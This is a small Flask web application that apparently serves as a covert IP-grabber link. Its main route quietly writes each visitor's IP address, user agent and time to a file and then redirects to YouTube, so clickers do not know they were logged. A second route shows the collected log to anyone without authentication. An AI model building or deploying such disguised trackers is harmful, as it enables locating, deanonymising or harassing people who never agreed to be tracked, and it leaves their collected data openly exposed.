from flask import Flask, request, redirect
import datetime

app = Flask(__name__)

@app.route("/")
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0]
    ua = request.headers.get('User-Agent', 'unknown')
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("visitors.txt", "a", encoding="utf-8") as f:
        f.write(f"{ts} | {ip} | {ua}\n")
    return redirect("https://www.youtube.com")

@app.route("/log")
def log():
    try:
        with open("visitors.txt", "r", encoding="utf-8") as f:
            return "<pre>" + f.read() + "</pre>"
    except:
        return "لا يوجد زوار بعد"

if __name__ == "__main__":
    app.run()
